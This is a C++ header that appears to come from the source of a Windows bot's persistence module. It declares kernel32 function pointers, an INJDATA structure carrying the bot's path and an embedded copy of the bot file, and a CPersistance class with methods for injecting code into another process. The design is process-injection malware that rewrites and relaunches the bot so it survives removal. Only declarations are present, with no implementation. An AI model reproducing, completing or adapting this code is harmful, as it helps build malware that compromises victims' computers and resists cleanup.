#ifndef __PERSISTANCE_H__
#define __PERSISTANCE_H__

struct INJDATA;

//KERNEL32.DLL
typedef HMODULE		(__stdcall*	fnGetModuleHandle)		(LPCTSTR); 
typedef FARPROC		(__stdcall*	fnGetProcAddress)		(HMODULE, LPCSTR); 
typedef HINSTANCE	(__stdcall*	fnLoadLibrary)			(LPCTSTR);
typedef BOOL		(__stdcall*	fnFreeLibrary)			(HMODULE);
typedef void		(__stdcall*	fnExitThread)			(DWORD); 
typedef HANDLE		(__stdcall* fnCreateMutex)			(LPSECURITY_ATTRIBUTES, BOOL, LPCTSTR);
typedef BOOL		(__stdcall* fnReleaseMutex)			(HANDLE);
typedef DWORD		(__stdcall* fnGetLastError)			();
typedef void		(__stdcall* fnSetLastError)			(DWORD);
typedef	UINT		(__stdcall* fnWinExec)				(LPCSTR, UINT);
typedef VOID		(__stdcall* fnSleep)				(DWORD);
typedef BOOL		(__stdcall* fnCloseHandle)			(HANDLE);
typedef HANDLE		(__stdcall* fnCreateFile)			(LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL		(__stdcall* fnWriteFile)			(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef	DWORD		(__stdcall* fnGetFileAttributes)	(LPCTSTR);
typedef BOOL		(__stdcall* fnSetFileAttributes)	(LPCTSTR, DWORD);

//Own Functions
typedef void		(__stdcall*	fnPersistanceThread)	(INJDATA*);

//Stucture
struct INJDATA {
	// kernel32.dll
	fnGetModuleHandle	GetModuleHandle;	//Preloaded
	fnLoadLibrary		LoadLibrary;		//Preloaded
	fnGetProcAddress	GetProcAddress;		//Preloaded
	fnFreeLibrary		FreeLibrary;		//Preloaded
	fnExitThread		ExitThread;			//Preloaded
	fnCreateMutex		CreateMutex;		//Preloaded
	fnReleaseMutex		ReleaseMutex;		//Preloaded
	fnGetLastError		GetLastError;		//Preloaded
	fnSetLastError		SetLastError;		//Preloaded
	fnWinExec			WinExec;			//Preloaded
	fnSleep				Sleep;				//Preloaded
	fnCloseHandle		CloseHandle;		//Preloaded
	fnCreateFile		CreateFile;			//Preloaded
	fnWriteFile			WriteFile;			//Preloaded
	fnGetFileAttributes GetFileAttributes;	//Preloaded
	fnSetFileAttributes SetFileAttributes;	//Preloaded

	// own functions
	fnPersistanceThread	PersistanceThread;

	// variables
	char	szMutexName[32];
	char	szBotPath[MAX_PATH];
	char	szBotFile[1024*800]; // ~800kbs -> fix it
	DWORD	dwBytes;
};

class CPersistance : public CThread {
public:
			 CPersistance();
	virtual	~CPersistance();

	BOOL	 Persistance(HANDLE hProcess);
	PDWORD	 Inject(HANDLE hProcess, DWORD cbCodeSize, LPVOID funcion);
	void	 Stop();
	void	*Run();

private:
	HANDLE	 m_hThread;
	BOOL	 m_bStop;
};


#endif